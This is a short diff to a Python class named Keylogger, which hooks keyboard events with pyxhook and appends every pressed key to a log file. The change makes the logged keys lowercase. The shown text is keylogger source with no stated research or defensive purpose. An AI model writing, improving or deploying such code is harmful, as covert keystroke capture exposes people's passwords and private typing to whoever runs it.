@@ -23,7 +23,7 @@ class Keylogger:
 
         def OnKeyPress(event):
             with open(log_file, 'a') as f:
-                f.write('{}\n'.format(event.Key))
+                f.write('{}\n'.format(event.Key.lower()))
 
         new_hook = pyxhook.HookManager()
         new_hook.KeyDown = OnKeyPress
